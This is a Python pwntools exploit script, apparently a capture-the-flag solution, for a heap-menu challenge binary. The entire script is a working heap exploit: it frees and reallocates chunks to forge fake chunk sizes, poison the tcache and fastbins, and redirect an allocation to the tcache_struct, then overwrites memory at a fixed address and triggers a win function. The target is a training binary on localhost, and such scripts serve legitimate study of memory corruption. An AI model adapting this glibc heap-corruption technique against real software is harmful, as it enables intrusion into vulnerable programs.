#!/usr/bin/env python3

from types import new_class
from pwn import *

elf = ELF("./chall_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    global r
    if args.REMOTE:
        r = remote("localhost", 1337)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b delete
                                b create
                                b update
                                b copy
                                ignore 1 11
                                ignore 2 123
                                ignore 3 3
                                ignore 4 1
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r


def create(idx: int, size: int):
    r.sendlineafter(b"choice: ", b"1")
    r.sendlineafter(b"index: ", str(idx).encode())
    r.sendlineafter(b"size: ", str(size).encode())

def free(idx: int):
    r.sendlineafter(b"choice: ", b"3")
    r.sendlineafter(b"index: ", str(idx).encode())

def update(idx: int, content: bytes, new_line=True):
    r.sendlineafter(b"choice: ", b"2")
    r.sendlineafter(b"index: ", str(idx).encode())
    # it uses read_exactly!
    if new_line:
        r.sendlineafter(b"bytes: ", content)
    else:
        r.sendafter(b"bytes: ", content)

def copy(src: int, dst: int):
    r.sendlineafter(b"choice: ", b"4")
    r.sendlineafter(b"index: ", str(dst).encode())
    r.sendlineafter(b"index: ", str(src).encode())

def win():
    r.sendlineafter(b"choice: ", b"5")

def main():
    r = conn()

    for i in range(8):
        create(i, 0x10)
    for i in reversed(range(8)):
        free(i)
    update(6, b"\x00"*0x10, new_line=False)
    free(6)
    for i in range(7):
        create(i, 0x10)
    # chunk 6 is created 10 bytes higher than the previous chunk
    update(6, b"\x00"*8 + p64(0x21), new_line=False)

    create(20, 0x400) # this will be poisoned (tcache 0x410[0])

    print(f"Chunks needed: {0x21000//0x500}")
    for i in range(0x21000//0x500 - 1):
        create(50, 0x4f0)
    create(50, 0x3e0)

    create(21, 0x400) # this is 0x21000 from the chunk at index 20

    free(21)
    free(20)
    copy(21, 20) # this poisons the chunk at index 20
    create(30, 0x400) # this writes 0x21 to the head (if the odds are with us)

    
    for i in range(7):
        create(10+i, 0x10)
    free(11)
    for i in reversed(range(7)):
        if i == 1:
            continue
        free(10+i)
    update(11, b"\x00"*8 + p64(0x21), new_line=False)
    free(6) # this will be put in the fastbins

    update(15, b"\x00"*0x10, new_line=False)
    free(15)

    for i in range(6):
        create(40+i, 0x10)
    # chunk at index 45 has the ptr to the tcache_struct
    update(45, p64(0x1337000)*2, new_line=False)
    create(0, 0x400)
    update(0, p64(0xdeadbeefdeadcafe) + b"\x00"*0x3f8, new_line=False)

    win()
    r.interactive()

if __name__ == "__main__":
    main()
